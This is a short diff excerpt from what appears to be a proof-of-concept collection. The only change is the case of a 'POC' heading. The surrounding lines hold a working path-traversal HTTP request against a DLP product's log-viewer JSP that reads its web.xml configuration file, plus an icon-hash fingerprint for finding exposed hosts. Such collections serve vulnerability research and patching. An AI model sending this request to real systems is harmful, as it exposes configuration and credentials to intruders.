@@ -8,7 +8,7 @@ icon_hash="616947260"
 
 ![](https://cdn.nlark.com/yuque/0/2024/png/1622799/1735566773129-315b9dc0-988c-47d2-a333-a2b6f4a7ec14.png)
 
-## poc
+## POC
 ```http
 GET /DLP/public/admintool/system_setting/sys_ds_logfile_displaylog.jsp?logType=tomcat&logFileName=../../../../../../D-Security/webapps/DLPWebApps/WEB-INF/web.xml HTTP/1.1
 Host: 
